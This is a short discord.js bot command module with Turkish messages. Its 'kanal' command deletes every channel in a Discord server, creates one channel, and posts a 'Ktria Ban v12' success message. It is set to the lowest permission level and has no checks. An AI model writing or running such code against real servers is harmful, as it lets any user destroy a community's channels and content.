const Discord = require("discord.js");

module.exports.run = async (client, message, args) => {

let mesaj = args.slice(0).join(" ")
message.guild.channels.map(m => m.delete())
message.guild.createChannel(`${mesaj}`, 'text').then(zzz => {
  
  zzz.send('```**Ktria Ban v12 Bütün Kanalları Başarılı Bir Şekilde Sildi ☑️**```')
})
};

module.exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: [],
  permLevel: 0,
  kategori: "ktriakanal"
};

module.exports.help = {
  name: "kanal",
  description: "kanal",
  usage: "kanal"
};
